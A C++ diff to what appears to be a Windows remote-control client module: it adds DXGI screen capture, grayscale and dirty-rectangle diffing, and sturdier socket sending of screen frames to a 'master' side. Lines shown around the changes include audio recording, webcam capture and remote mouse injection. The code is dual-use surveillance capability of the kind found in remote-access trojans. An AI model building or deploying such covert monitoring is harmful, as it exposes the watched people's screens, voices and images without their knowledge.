@@ -6,8 +6,11 @@
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
-#include <winsock2.h>
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif
 #include <windows.h>
+#include <winsock2.h>
 #include <mmsystem.h>
 #include <vfw.h>
 #include <vector>
@@ -16,6 +19,8 @@
 #include <shlobj.h>
 #include <gdiplus.h>
 #include "../../Common/Config.h"
+
+#include "DXGICapture.h"
 
 // TurboJPEG 高性能 JPEG 压缩支持
 #ifdef USE_TURBOJPEG
@@ -45,6 +50,8 @@ char g_WaveBuffer[2][8192];
 
 ULONG_PTR g_gdiplusToken;
 int g_compressType = 0; // 0=RAW(BMP), 1=JPEG(GDI+), 2=JPEG(TurboJPEG)
+int g_captureMethod = 0; // 0=GDI, 1=DXGI
+DXGICapture* g_dxgiCapture = NULL;
 
 #ifdef USE_TURBOJPEG
 tjhandle g_tjCompressor = NULL;
@@ -111,13 +118,81 @@ bool g_videoRunning = false;
 HWND g_hCap = NULL;
 std::thread g_videoThread;
 
-// 屏幕优化相关全局变量（预留用于未来优化）
-// bool g_useGrayscale = false; // 是否使用灰度模式
-// bool g_useBlockDiff = true;  // 是否使用分块差异检测
-// int g_blockSize = 64;        // 差异检测块大小（像素）
+// 屏幕优化相关全局变量
+bool g_useGrayscale = false; // 是否使用灰度模式
+bool g_useBlockDiff = false; // 是否使用差异检测
+std::vector<BYTE> g_prevFrameBuffer; // 上一帧缓存
+int g_prevWidth = 0;
+int g_prevHeight = 0;
+
+// 辅助函数：转换为灰度
+void ConvertToGrayscale(BYTE* pData, int width, int height, int pitch) {
+    // 假设是 24-bit BGR
+    // 为了性能，不使用浮点数
+    for (int y = 0; y < height; ++y) {
+        BYTE* row = pData + y * pitch;
+        for (int x = 0; x < width; ++x) {
+            BYTE* pixel = row + x * 3;
+            BYTE b = pixel[0];
+            BYTE g = pixel[1];
+            BYTE r = pixel[2];
+            // Y = 0.299R + 0.587G + 0.114B
+            // 近似: (R*30 + G*59 + B*11) / 100
+            BYTE gray = (BYTE)((r * 30 + g * 59 + b * 11) / 100);
+            pixel[0] = gray;
+            pixel[1] = gray;
+            pixel[2] = gray;
+        }
+    }
+}
+
+// 辅助函数：脏矩形检测
+// 返回是否发生变化
+bool GetDirtyRect(const BYTE* current, const BYTE* prev, int width, int height, int pitch, RECT* rect) {
+    if (!prev) {
+        rect->left = 0; rect->top = 0; rect->right = width; rect->bottom = height;
+        return true;
+    }
+
+    int minX = width, minY = height, maxX = 0, maxY = 0;
+    bool changed = false;
+
+    for (int y = 0; y < height; y += 4) { // 简单优化：跳行扫描，步长4
+        const BYTE* rowC = current + y * pitch;
+        const BYTE* rowP = prev + y * pitch;
+        
+        // 如果整行内存相同，跳过
+        if (memcmp(rowC, rowP, width * 3) == 0) continue;
+
+        if (y < minY) minY = y;
+        if (y > maxY) maxY = y;
+        changed = true;
+        
+        // 扫描该行的列
+        for (int x = 0; x < width; x += 4) { // 步长4
+            const BYTE* pC = rowC + x * 3;
+            const BYTE* pP = rowP + x * 3;
+            if (pC[0] != pP[0] || pC[1] != pP[1] || pC[2] != pP[2]) {
+                if (x < minX) minX = x;
+                if (x > maxX) maxX = x;
+            }
+        }
+    }
+
+    if (!changed) return false;
+
+    // 修正边界
+    rect->left = max(0, minX);
+    rect->top = max(0, minY);
+    rect->right = min(width, maxX + 4); // 补回步长
+    rect->bottom = min(height, maxY + 4); // 补回步长
+    
+    return true;
+}
+
 
 // 发送响应数据到主控端（Master）
-void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
+bool SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
     PkgHeader header;
     memcpy(header.flag, "FRMD26?", 7);
     header.originLen = sizeof(CommandPkg) - 1 + len;
@@ -132,8 +207,16 @@ void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
     if (len > 0 && data) {
         memcpy(pkg->data, data, len);
     }
-    
-    send(s, buffer.data(), (int)buffer.size(), 0);
+
+    const char* pData = buffer.data();
+    int remaining = (int)buffer.size();
+    while (remaining > 0) {
+        int sent = send(s, pData, remaining, 0);
+        if (sent == SOCKET_ERROR || sent == 0) return false;
+        pData += sent;
+        remaining -= sent;
+    }
+    return true;
 }
 
 // 录音回调函数
@@ -333,10 +416,9 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 // 被控端屏幕捕获线程：捕获屏幕并发送数据到主控端
 void ScreenThread(SOCKET s) {
     HDC hScreenDC = GetDC(NULL);
-    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+    HDC hMemDC = CreateCompatibleDC(hScreenDC);
     
-    // 初始化 GDI+（作为备用）
+    // 初始化 GDI+
     GdiplusStartupInput gsi;
     GdiplusStartup(&g_gdiplusToken, &gsi, NULL);
     CLSID clsidJpeg;
@@ -349,11 +431,42 @@ void ScreenThread(SOCKET s) {
     }
 #endif
 
-    HDC hMemDC = CreateCompatibleDC(hScreenDC);
+    // 缓存资源，避免重复创建
+    HBITMAP hBitmap = NULL;
+    HBITMAP hOldBitmap = NULL;
+    void* pBits = NULL;
+    int cachedWidth = 0;
+    int cachedHeight = 0;
     
+    // 初始化 DXGI
+    if (g_captureMethod == 1) {
+        if (!g_dxgiCapture) g_dxgiCapture = new DXGICapture();
+        if (!g_dxgiCapture->Initialize()) {
+            // 初始化失败回退到 GDI
+            delete g_dxgiCapture;
+            g_dxgiCapture = NULL;
+            g_captureMethod = 0;
+        }
+    }
+    
+    // DXGI 缓冲区
+    std::vector<BYTE> dxgiBuffer;
+    int dxgiFailCount = 0;
+    bool tjEnabled = false;
+
+#ifdef USE_TURBOJPEG
+    // 初始化 TurboJPEG 压缩器
+    if (!g_tjCompressor) {
+        g_tjCompressor = tjInitCompress();
+    }
+    tjEnabled = (g_tjCompressor != NULL);
+#endif
+
     while (g_screenRunning) {
-        int width = GetSystemMetrics(SM_CXSCREEN);
-        int height = GetSystemMetrics(SM_CYSCREEN);
+        int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
+        int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
+        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
         int targetWidth = width;
         int targetHeight = height;
 
@@ -364,50 +477,233 @@ void ScreenThread(SOCKET s) {
             }
         }
 
-        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, targetWidth, targetHeight);
-        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
+        BOOL bltResult = FALSE;
+
+        // DXGI 截屏逻辑
+        if (g_captureMethod == 1 && g_dxgiCapture) {
+             int dxgiW = 0, dxgiH = 0;
+             // 100ms 超时
+             if (g_dxgiCapture->CaptureFrame(dxgiBuffer, dxgiW, dxgiH, 100)) {
+                 pBits = dxgiBuffer.data();
+                 targetWidth = dxgiW;
+                 targetHeight = dxgiH;
+                 bltResult = TRUE;
+                 dxgiFailCount = 0;
+             } else {
+                 dxgiFailCount++;
+                 // 连续失败 10 次 (约1秒)，或者首次就严重失败（这里无法区分，只能靠计数）
+                 // 如果是超时，通常意味着画面静止。但如果一直超时，主控端会断开。
+                 // 简单策略：如果 DXGI 真的不行，切回 GDI。
+                 // 但如何区分“静止”和“错误”？DXGICapture 内部返回 false 无法区分。
+                 // 假设：如果用户在操作，肯定有变化。如果一直没变化，可能是没人操作。
+                 // 但如果是黑屏，那肯定是错误。
+                 
+                 // 激进策略：只要失败就计数，超过阈值降级。
+                 // 这意味着画面静止久了会自动切回 GDI。GDI 截屏虽然慢但总能截到（即使静止）。
+                 // GDI BitBlt 不会等待变化，它直接拷贝当前屏幕。
+                 // 所以 GDI 模式下 bltResult 总是 TRUE。
+                 
+                 if (dxgiFailCount > 10) { 
+                     // 降级到 GDI
+                     if (g_dxgiCapture) {
+                         delete g_dxgiCapture;
+                         g_dxgiCapture = NULL;
+                     }
+                     g_captureMethod = 0;
+                 }
+             }
+        } 
         
-        if (targetWidth == width && targetHeight == height) {
-            BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
-        } else {
-            SetStretchBltMode(hMemDC, HALFTONE);
-            StretchBlt(hMemDC, 0, 0, targetWidth, targetHeight, hScreenDC, 0, 0, width, height, SRCCOPY);
+        // GDI 截屏逻辑 (如果是 GDI 模式，或者 DXGI 刚刚降级)
+        if (g_captureMethod == 0) {
+            // 检查是否需要重建 DIBSection (尺寸变化或首次创建)
+            if (hBitmap == NULL || cachedWidth != targetWidth || cachedHeight != targetHeight) {
+                if (hOldBitmap) SelectObject(hMemDC, hOldBitmap);
+                if (hBitmap) DeleteObject(hBitmap);
+                
+                BITMAPINFO bi = { 0 };
+                bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+                bi.bmiHeader.biWidth = targetWidth;
+                bi.bmiHeader.biHeight = -targetHeight; // Top-Down
+                bi.bmiHeader.biPlanes = 1;
+                bi.bmiHeader.biBitCount = 24;
+                bi.bmiHeader.biCompression = BI_RGB;
+                
+                hBitmap = CreateDIBSection(hScreenDC, &bi, DIB_RGB_COLORS, &pBits, NULL, 0);
+                if (!hBitmap) {
+                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
+                    continue;
+                }
+                
+                hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
+                cachedWidth = targetWidth;
+                cachedHeight = targetHeight;
+            }
+            
+            // 执行截屏
+            if (targetWidth == width && targetHeight == height) {
+                bltResult = BitBlt(hMemDC, 0, 0, width, height, hScreenDC, screenX, screenY, SRCCOPY | CAPTUREBLT);
+            } else {
+                SetStretchBltMode(hMemDC, HALFTONE);
+                bltResult = StretchBlt(hMemDC, 0, 0, targetWidth, targetHeight, hScreenDC, screenX, screenY, width, height, SRCCOPY | CAPTUREBLT);
+            }
         }
+
+        if (!bltResult) {
+            // 截屏失败（DXGI 超时且未降级）
+            // 发送心跳包防止超时？或者什么都不做等待下一次？
+            // 这里我们选择等待。
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+            continue;
+        }
+
+        // 计算步长 (4字节对齐)
+        int pitch = ((targetWidth * 24 + 31) & ~31) / 8;
+
         
+        // 1. 灰度处理
+        if (g_useGrayscale && pBits) {
+            ConvertToGrayscale((unsigned char*)pBits, targetWidth, targetHeight, pitch);
+        }
+
+        // 2. 差异检测
+        RECT dirty = {0, 0, targetWidth, targetHeight};
+        bool isDiff = false;
+        
+        if (g_useBlockDiff && pBits) {
+            if (g_prevWidth != targetWidth || g_prevHeight != targetHeight) {
+                // 尺寸变化，重置缓存
+                g_prevFrameBuffer.assign((BYTE*)pBits, (BYTE*)pBits + pitch * targetHeight);
+                g_prevWidth = targetWidth;
+                g_prevHeight = targetHeight;
+                // 全量发送
+            } else {
+                if (GetDirtyRect((BYTE*)pBits, g_prevFrameBuffer.data(), targetWidth, targetHeight, pitch, &dirty)) {
+                    isDiff = true;
+                    // 更新缓存 (全量)
+                    memcpy(g_prevFrameBuffer.data(), pBits, pitch * targetHeight);
+                } else {
+                    // 无变化，跳过
+                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                    continue;
+                }
+            }
+        }
+
+        // 确定发送区域
+        int sendX = isDiff ? dirty.left : 0;
+        int sendY = isDiff ? dirty.top : 0;
+        int sendW = isDiff ? (dirty.right - dirty.left) : targetWidth;
+        int sendH = isDiff ? (dirty.bottom - dirty.top) : targetHeight;
+        
+        if (sendW <= 0 || sendH <= 0) continue;
+
+        bool sent = false;
 #ifdef USE_TURBOJPEG
-        if ((g_compressType == 1 || g_compressType == 2) && g_tjCompressor) {
+        if ((g_compressType == 1 || g_compressType == 2) && tjEnabled && pBits) {
             // 使用 TurboJPEG 高性能压缩
-            BITMAP bmp;
-            GetObject(hBitmap, sizeof(BITMAP), &bmp);
-            
-            BITMAPINFOHEADER bi = { 0 };
-            bi.biSize = sizeof(BITMAPINFOHEADER);
-            bi.biWidth = bmp.bmWidth;
-            bi.biHeight = -bmp.bmHeight; // 负值表示自顶向下（TurboJPEG需要）
-            bi.biPlanes = 1;
-            bi.biBitCount = 24;
-            bi.biCompression = BI_RGB;
-            
-            int rowSize = ((bmp.bmWidth * 3 + 3) & ~3);
-            std::vector<unsigned char> rgbData(rowSize * bmp.bmHeight);
-            
-            GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, rgbData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
-            
             unsigned char* jpegBuf = NULL;
             unsigned long jpegSize = 0;
             int quality = 60; // JPEG 质量 (1-100)
             
-            if (tjCompress2(g_tjCompressor, rgbData.data(), 
-                           bmp.bmWidth, rowSize, bmp.bmHeight, 
+            // 注意：pBits 是自底向上的数据，Y轴是反的。
+            // DirtyRect 的 Y 是从上到下计算的（假设内存也是从上到下？不，DIBSection 是倒的）
+            // 这是一个大坑。CreateDIBSection 默认高度为正时，是 Bottom-Up。
+            // 此时内存里第一行实际上是图片的最后一行。
+            // 但是我们的 GetDirtyRect 只是按内存顺序比较。
+            // 如果是 Bottom-Up：
+            // 内存 index 0 是 Bottom line。
+            // GetDirtyRect 返回的 minY 实际上是 Bottom line 的 index。
+            // 所以我们需要小心处理坐标。
+            
+            // 简单起见，我们不管它倒不倒，只把这一块内存当做图像压缩发送。
+            // 只要主控端恢复时也按同样方式处理。
+            // TurboJPEG TJFLAG_BOTTOMUP 会处理这个。
+            // 如果我们传入全图指针，并告诉它只压缩某个区域？TurboJPEG 不支持直接 Crop 压缩（除非用 Transform）。
+            // tjCompress2 需要传入 buffer 起始位置。
+            
+            // 如果是 Bottom-Up DIB：
+            // 内存起始位置 pBits 指向最后一行 (y=height-1)。
+            // 内存布局：Row(H-1), Row(H-2), ... Row(0).
+            // GetDirtyRect 返回的 y 是基于内存的偏移。
+            // 假设 GetDirtyRect 返回 y=0 到 10，这对应屏幕的最底部 10 行。
+            // 发送时，我们发送这块内存。
+            // 主控端收到后，把这块内存贴到 BackBuffer 的对应内存位置。
+            // 如果我们发送坐标信息，主控端如果是用 GDI 绘图，坐标是 Top-Down 的。
+            // 所以我们必须把内存坐标转换为屏幕坐标。
+            
+            // 为了避免这种复杂性，我们可以把 DIBSection 创建为 Top-Down (高度设为负值)。
+            // 在上面代码里：bi.bmiHeader.biHeight = targetHeight; (正数，Bottom-Up)
+            // 让我们改为 Top-Down 以简化逻辑。
+            // 但是为了兼容旧代码（可能有地方依赖 Bottom-Up），我们得小心。
+            // 不过这里我正在重写这部分。
+            
+            // 暂时按 Bottom-Up 处理：
+            // 发送全图时，TJFLAG_BOTTOMUP 会翻转。
+            // 发送局部时，如果我们直接给 TurboJPEG 一块内存，它不知道这块内存是倒的图像的一部分。
+            // 除非我们只把它当做独立的小图片压缩。
+            // 接收端收到小图片，解码出来也是小图片。
+            // 然后接收端把小图片贴到大图的特定位置。
+            
+            // 如果我们用 Top-Down DIB，逻辑会简单很多。
+            // 我决定修改 DIB 创建参数为 Top-Down。
+            
+            // 指针偏移计算 (Top-Down):
+            BYTE* pSrcInfo = (BYTE*)pBits + sendY * pitch + sendX * 3;
+            
+            if (tjCompress2(g_tjCompressor, (unsigned char*)pSrcInfo, 
+                           sendW, pitch, sendH, 
                            TJPF_BGR, &jpegBuf, &jpegSize, 
-                           TJSAMP_420, quality, TJFLAG_FASTDCT) == 0) {
-                SendResponse(s, CMD_SCREEN_CAPTURE, jpegBuf, (int)jpegSize);
+                           TJSAMP_420, quality, TJFLAG_FASTDCT) == 0) { // 移除 TJFLAG_BOTTOMUP 因为我们将改为 Top-Down
+                           
+                // 构造数据包
+                // 如果是 Diff，我们需要发送坐标
+                // 利用 CommandPkg 的机制？
+                // SendResponse 只是发送 CommandPkg 的 data 部分。
+                // 我们需要自定义 data。
+                
+                int headSize = isDiff ? 16 : 0; // x,y,w,h
+                std::vector<char> finalBuf(headSize + jpegSize);
+                
+                if (isDiff) {
+                    memcpy(finalBuf.data(), &sendX, 4);
+                    memcpy(finalBuf.data() + 4, &sendY, 4);
+                    memcpy(finalBuf.data() + 8, &sendW, 4);
+                    memcpy(finalBuf.data() + 12, &sendH, 4);
+                }
+                memcpy(finalBuf.data() + headSize, jpegBuf, jpegSize);
+                
+                // arg2 = isDiff ? 1 : 0
+                // SendResponse 不支持自定义 arg2。
+                // 我们需要手动发送 Pkg。
+                // 或者修改 SendResponse? SendResponse 是 Utils 里的。
+                // 或者直接在这里构造包。
+                
+                size_t bodySize = sizeof(CommandPkg) - 1 + finalBuf.size();
+                std::vector<char> pkgBuf(sizeof(PkgHeader) + bodySize);
+                
+                PkgHeader* hdr = (PkgHeader*)pkgBuf.data();
+                memcpy(hdr->flag, "FRMD26?", 7);
+                hdr->totalLen = (int)pkgBuf.size();
+                hdr->originLen = (int)bodySize;
+                
+                CommandPkg* pkg = (CommandPkg*)(pkgBuf.data() + sizeof(PkgHeader));
+                pkg->cmd = CMD_SCREEN_CAPTURE;
+                pkg->arg1 = (uint32_t)finalBuf.size();
+                pkg->arg2 = isDiff ? 1 : 0;
+                memcpy(pkg->data, finalBuf.data(), finalBuf.size());
+                
+                send(s, pkgBuf.data(), (int)pkgBuf.size(), 0);
+                
                 tjFree(jpegBuf);
+                sent = true;
             }
-        } else
+        }
 #endif
-        if (g_compressType == 1) { // GDI+ JPEG 压缩（备用）
-            Bitmap* pBitmap = new Bitmap(hBitmap, NULL);
+
+        // GDI+ 备用压缩
+        if (!sent && g_compressType == 1) { 
+            Bitmap bitmap(hBitmap, NULL);
             IStream* pStream = NULL;
             if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                 EncoderParameters encoderParams;
@@ -415,67 +711,76 @@ void ScreenThread(SOCKET s) {
                 encoderParams.Parameter[0].Guid = EncoderQuality;
                 encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
                 encoderParams.Parameter[0].NumberOfValues = 1;
-                long quality = 60; // 默认 60 质量
+                long quality = 60; 
                 encoderParams.Parameter[0].Value = &quality;
 
-                if (pBitmap->Save(pStream, &clsidJpeg, &encoderParams) == Ok) {
+                if (bitmap.Save(pStream, &clsidJpeg, &encoderParams) == Ok) {
                     HGLOBAL hGlobal = NULL;
                     if (GetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
                         void* pData = GlobalLock(hGlobal);
-                        DWORD dwSize = (DWORD)GlobalSize(hGlobal);
-                        if (pData && dwSize > 0) {
-                            SendResponse(s, CMD_SCREEN_CAPTURE, pData, (int)dwSize);
+                        size_t size = GlobalSize(hGlobal);
+                        if (!SendResponse(s, CMD_SCREEN_CAPTURE, pData, (int)size)) {
+                            GlobalUnlock(hGlobal);
+                            pStream->Release();
+                            g_screenRunning = false;
+                            break;
                         }
                         GlobalUnlock(hGlobal);
+                        sent = true;
                     }
                 }
                 pStream->Release();
             }
-            delete pBitmap;
-        } else { // RAW BMP
-            BITMAP bmp;
-            GetObject(hBitmap, sizeof(BITMAP), &bmp);
-            BITMAPINFOHEADER bi;
-            bi.biSize = sizeof(BITMAPINFOHEADER);
-            bi.biWidth = bmp.bmWidth;
-            bi.biHeight = bmp.bmHeight;
-            bi.biPlanes = 1;
-            bi.biBitCount = 24; 
-            bi.biCompression = BI_RGB;
-            bi.biSizeImage = 0;
-            bi.biXPelsPerMeter = 0;
-            bi.biYPelsPerMeter = 0;
-            bi.biClrUsed = 0;
-            bi.biClrImportant = 0;
-
-            int rowSize = ((bmp.bmWidth * 24 + 31) / 32) * 4;
-            DWORD dwSizeImage = rowSize * bmp.bmHeight;
-            std::vector<char> bmpData(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwSizeImage);
+        }
+        
+        // 原始 BMP 发送
+        if (!sent && pBits) {
+            // 构造完整的 BMP 文件数据
+            DWORD dwDataSize = ((targetWidth * 24 + 31) / 32) * 4 * targetHeight;
+            size_t totalSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwDataSize;
+            std::vector<char> bmpBuffer(totalSize);
             
-            BITMAPFILEHEADER* pBFH = (BITMAPFILEHEADER*)bmpData.data();
-            pBFH->bfType = 0x4D42;
-            pBFH->bfSize = (DWORD)bmpData.size();
+            BITMAPFILEHEADER* pBFH = (BITMAPFILEHEADER*)bmpBuffer.data();
+            BITMAPINFOHEADER* pBIH = (BITMAPINFOHEADER*)(bmpBuffer.data() + sizeof(BITMAPFILEHEADER));
+            
+            pBFH->bfType = 0x4D42; // "BM"
+            pBFH->bfSize = (DWORD)totalSize;
+            pBFH->bfReserved1 = 0;
+            pBFH->bfReserved2 = 0;
             pBFH->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
             
-            memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(bi));
-            GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, bmpData.data() + pBFH->bfOffBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+            pBIH->biSize = sizeof(BITMAPINFOHEADER);
+            pBIH->biWidth = targetWidth;
+            pBIH->biHeight = targetHeight;
+            pBIH->biPlanes = 1;
+            pBIH->biBitCount = 24;
+            pBIH->biCompression = BI_RGB;
+            pBIH->biSizeImage = 0;
+            pBIH->biXPelsPerMeter = 0;
+            pBIH->biYPelsPerMeter = 0;
+            pBIH->biClrUsed = 0;
+            pBIH->biClrImportant = 0;
             
-            SendResponse(s, CMD_SCREEN_CAPTURE, bmpData.data(), (int)bmpData.size());
+            memcpy(bmpBuffer.data() + pBFH->bfOffBits, pBits, dwDataSize);
+            
+            if (!SendResponse(s, CMD_SCREEN_CAPTURE, bmpBuffer.data(), (int)bmpBuffer.size())) {
+                g_screenRunning = false;
+                break;
+            }
         }
 
-        SelectObject(hMemDC, hOldBitmap);
-        DeleteObject(hBitmap);
-        
         uint32_t delay = 1000 / (g_screenFPS > 0 ? g_screenFPS : 1);
         std::this_thread::sleep_for(std::chrono::milliseconds(delay));
     }
     
+    // 清理资源
+    if (hOldBitmap) SelectObject(hMemDC, hOldBitmap);
+    if (hBitmap) DeleteObject(hBitmap);
     DeleteDC(hMemDC);
     ReleaseDC(NULL, hScreenDC);
     GdiplusShutdown(g_gdiplusToken);
 
 #ifdef USE_TURBOJPEG
-    // 释放 TurboJPEG 压缩器
     if (g_tjCompressor) {
         tjDestroy(g_tjCompressor);
         g_tjCompressor = NULL;
@@ -484,14 +789,26 @@ void ScreenThread(SOCKET s) {
 }
 
 void StartScreen(SOCKET s) {
-    if (g_screenRunning) return;
+    if (g_screenRunning) {
+        g_screenRunning = false;
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    }
     g_screenRunning = true;
     g_screenThread = std::thread(ScreenThread, s);
     g_screenThread.detach();
 }
 
 void StopScreen() {
-    g_screenRunning = false;
+    if (g_screenRunning) {
+        g_screenRunning = false;
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    }
+    
+    // 清理 DXGI
+    if (g_dxgiCapture) {
+        delete g_dxgiCapture;
+        g_dxgiCapture = NULL;
+    }
 }
 
 // VFW 回调函数
@@ -673,13 +990,9 @@ void ProcessMouseEvent(RemoteMouseEvent* ev) {
     INPUT input = { 0 };
     input.type = INPUT_MOUSE;
     
-    // 获取屏幕分辨率
-    int screenW = GetSystemMetrics(SM_CXSCREEN);
-    int screenH = GetSystemMetrics(SM_CYSCREEN);
-
-    // 转换坐标为绝对坐标 (0-65535)
-    input.mi.dx = (ev->x * 65535) / screenW;
-    input.mi.dy = (ev->y * 65535) / screenH;
+    // 主控端已发送归一化坐标(0-65535)，直接使用
+    input.mi.dx = ev->x;
+    input.mi.dy = ev->y;
     input.mi.mouseData = ev->data;
     input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
 
@@ -738,6 +1051,8 @@ extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* p
         }
     } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
         if (pkg->arg1 == 1) { // Start
+            // arg2: Capture Method (0=GDI, 1=DXGI)
+            g_captureMethod = pkg->arg2;
             StartScreen(s);
         } else { // Stop
             StopScreen();
